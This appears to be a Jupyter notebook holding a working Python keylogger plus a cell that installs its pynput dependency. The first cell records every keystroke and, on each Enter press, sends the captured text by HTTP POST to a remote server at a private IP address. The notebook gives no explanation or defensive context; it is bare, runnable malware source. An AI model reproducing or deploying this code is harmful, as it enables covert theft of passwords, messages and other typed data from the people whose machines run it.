{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9c9c1e9",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Listener, Key\n",
    "import requests\n",
    "\n",
    "server_url = 'http://172.30.1.6:5000/get_logs'\n",
    "logs = ''\n",
    "\n",
    "def on_press(key):\n",
    "    global logs\n",
    "\n",
    "    if key == Key.enter:\n",
    "        try:\n",
    "            requests.post(server_url, data={'logs': logs})\n",
    "        except:\n",
    "            print('Server error!')\n",
    "\n",
    "        logs = ''\n",
    "    else:\n",
    "        logs += str(key).replace(\"'\", \"\")\n",
    "\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "0f108ceb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynputNote: you may need to restart the kernel to use updated packages.\n",
      "  Downloading pynput-1.7.3-py2.py3-none-any.whl (99 kB)\n",
      "Requirement already satisfied: six in c:\\anconda\\lib\\site-packages (from pynput) (1.15.0)\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.3\n",
      "\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
